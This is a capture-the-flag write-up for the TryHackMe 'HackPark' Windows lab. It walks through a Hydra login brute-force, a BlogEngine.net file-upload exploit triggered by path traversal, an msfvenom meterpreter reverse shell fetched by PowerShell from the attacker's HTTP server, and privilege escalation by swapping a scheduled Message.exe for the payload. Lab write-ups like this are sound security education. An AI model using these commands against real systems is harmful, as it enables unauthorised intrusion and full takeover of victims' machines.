# HackPark

## Through this box I learned :
- How to use Hydra and inspect for a post request.
- Upload a file in BlogEngine.net 
- Gain access to a meterpreter shell with a reverse_tcp payload.
- Use WinPeas.
- Take advantage of the Windows Scheduler to priv esc.

### Section 1 : Scanning and Recon

Let's start with a nmap : 

![image](/assets/img/HackPark/nmap.png)

We see that a web server is running, let's go check what it's all about.

![image](/assets/img/HackPark/web.png)

On the nav-bar, you see that their is a page to log-in, let's check that out.

![image](/assets/img/HackPark/navlog.png)

We have a log-in page, THM tells us to use Hydra to brute-force a login so let's do it !

### Brute Forcing with Hydra 

_Hydra is a parallelized, fast and flexible login cracker._

First, we need to know the type of request the form is making to the webserver.
I just inspected the page then search for "method" in the search bar.

Then launch the hydra attack with the following : 
```bash 
hydra -v -l admin -P /home/edwards/Downloads/rockyou.txt 10.10.7.187 http-post-form "/Account/login.aspx:__VIEWSTATE=%2BzSkE5rKklYx2evyff1oZJyuSWT7%2FP%2BrwCqOuY9eQFnN3I9b9H%2FemK0b4edjD%2BX4D0kYN6MJXUIltXwXt0PReeyBxoseUQg%2BlNpW6CHIGWNzl%2FGSvdwSZX179PJ%2FI3%2F64LNM7KzKj9sc4BMO83WdCE0KH%2FPjXAKd4RAQ7poy1tOiO7cd&__EVENTVALIDATION=8UPWUPAn6s7hJvO0Pl8kCCO3NAmIgs7nlpsgIlY%2FBUKl7fwtvPmUalPJ5PygYkVuz1H356PzRXwi%2FHQ3z8iJpgXHs8%2BloBQ4qlIePP6FdcvcR2qoLptuS0C5xNkNhrzvN5IJshWQx%2BF3kjK4PfMhuSyiPjbKZA2aFsYrqvz5b2BHveGR&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -t 64
```

- In this code, we have to change the Password and Username to set the variable, and put the "Login Failed", so Hydra will know when the password will be the good one.

With the post that was on the main page, we can guess that the username is admin.
Then we need to give a list to find the password and the right request that we found with the inspect element (or with BurpSuite)

Let's login after our Brute Forcing Attack.

On the "about" section, we find interesting informations about he blogengine version.

![image](/assets/img/HackPark/version.png)

Let's google the version to find an exploit. 
On exploit DB I found this : 

![image](/assets/img/HackPark/cve.png)

We have all the informations required to launch this exploit successfully. 
We need first to change the ip addresse and the port inside the file.

![image](/assets/img/HackPark/postac.png)

Save it as PostView.ascx then go to the editor, create a new post or take the one already created.

Select the icon to upload a file. 

![image](/assets/img/HackPark/upload.png)

Set up a netcat connection.
```bash 
nc -lnvp 5555 
```

Then go the url specified in the exploit file to trigger your payload. 
```bash 
http://<ip>/?theme=../../App_Data/files
```

And normally on your netcat terminal you will have a shell !

### Section 3 : Priv esc with Metasploit

We need to get a meterpreter session, since the one we have right now is pretty unstable.
We are gonna create a msfvenom payload, then set a multi handler on our msf console.

First, download the payload with msfvenom.
```bash 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.15.91 LPORT=4555 -f exe > shell.exe
```

We need to find a directory where we have to right to put a file in.
I went to c:\Windows\Temp, in general it's commun that you will have the authorization to write in it. 

Set up a python simple server on an other terminal to send the payload.
```bash
python -m http.server
```

![image](/assets/img/HackPark/python.png)

Then upload the msfvenom payload in the windows machine. 
```bash
powershell -c "Invoke-WebRequest -Uri 'http://10.11.15.91:8000/shell.exe' -OutFile 'shell.exe'
```

![image](/assets/img/HackPark/upload1.png)
_As you can see the file is in_

Now we are gonna create a listener on metasploit.

![image](/assets/img/HackPark/msfoptions.png)
_Be sure to set the same port that the mfsvenom payload that you created before_

Launch the shell.exe
```bash
.\shell.exe
```

And you will have a meterepreter session open ;)

### Section 4 : Priv esc with winPEAS 

I'm gonna upload winPEAS on the machine to get infos.

Same manipulation with the python server up. 

```bash
powershell -c "Invoke-WebRequest -Uri 'http://10.11..15.91:8000/winPEAS.bat' -OutFile 'winPEAS.bat'
```

You can also use the 'ps' command of meterpreter for this box.

![image](/assets/img/HackPark/winupload.png)

Launch winPEAS to get plenty of useful informations about the machine. 

We can see that there is a WindowsScheduler process running, that can be exploitable.

![image](/assets/img/HackPark/scedule.png)

Let's move to the SystemScheduler directory located at : 
c:\Program Files (x86)\SystemScheduler

![image](/assets/img/HackPark/ls.png)

We have an events directory, let's see what's inside.

![image](/assets/img/HackPark/events.png)

I looked into the "20198415519.INI_LOG.txt" 
Inside you can see that every 30 sec, the Message.exe is launched then killed, since the file runs as Administrator we can take advantage of this to create a payload and run it as Message.Exe.

![image](/assets/img/HackPark/log.png)

Upload again your shell.exe in the previous directory where Message.exe is stored.
```bash
powershell -c "Invoke-WebRequest -Uri 'http://10.11.15.91:8000/shell.exe' -OutFile 'shell.exe'
```

![image](/assets/img/HackPark/shell.png)
_The file is uploaded into the SystemScheduler_

Then move the Message.exe as Message.bat and your shell.exe as Message.exe

Background your session, run the listener again and you will have an other session opening and you will be Administrator !

![image](/assets/img/HackPark/admin.png)

Then you can look for flags.
